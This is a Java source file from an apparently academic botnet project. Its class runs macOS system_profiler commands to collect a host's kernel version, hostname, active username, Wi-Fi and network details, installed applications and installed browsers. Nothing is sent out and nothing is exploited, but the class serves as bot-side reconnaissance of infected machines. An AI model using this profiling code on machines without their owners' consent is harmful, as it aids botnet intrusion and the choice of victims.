/*
  The MIT License (MIT)

  Copyright (c) 2017 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.tool.runtime;

import java.util.Random;

import lombok.Data;
import lombok.NoArgsConstructor;

/**
 * This class provides methods for the detection of sys info from Mac OS X operating system 
 * @author Giacomo Marciani {@literal <gmarciani@ieee.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0.0
 * @see Random
 */

@Data
@NoArgsConstructor
public class AppleSysInfoTools {

	/* Apple command: system_profiler -listDataTypes */
	
	/**
	 * Returns the kernel version of the system
	 * @return kernel Version
	 */
	public String getKernelVersion(){
		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  Kernel' 'Version | awk -F':' '{print $2}'");
	}
	
	/**
	 * Returns the name of the host
	 * @return hostname
	 */
	public String getHostName(){
		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  Computer' 'Name | awk -F':' '{print $2}'");
	}
	
	/**
	 * Returns the username of the active user on the system
	 * @return username
	 */
	public String getUserName(){
		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  User' 'Name | awk -F':' '{print $2}'");
	}
	
	/**
	 * Returns info of the network it is connected to the system
	 * @return network info
	 */
	public String getNetworkData(){
		return RuntimeManager.runCmd("system_profiler SPAirPortDataType");
	}
	
	/**
	 * Returns the list of applications installed on the system
	 * @return applications list
	 */
	public String getApplications(){
		return RuntimeManager.runCmd("system_profiler SPApplicationsDataType");
	}
	
	/**
	 * Returns the local connections of the system
	 * @return local connections list
	 */
	public String getNetworkLocations(){
		return RuntimeManager.runCmd("system_profiler SPNetworkLocationDataType");
	}
	
	/**
	 * Returns the list of browsers installed on the system
	 * @return browsers list
	 */
	public String getBrowsers(){
		String app = RuntimeManager.runCmd("system_profiler SPApplicationsDataType");
		String browsers = "";
		
		if(app.contains("Chrome.app"))
			browsers +="\nGoogle Chrome";
		if(app.contains("Safari.app"))
			browsers +="\nSafari";
		if(app.contains("Mozilla.app"))
			browsers +="\nMozilla";
		if(app.contains("Opera.app"))
			browsers +="\nOpera";
		
		return browsers;
	}	
}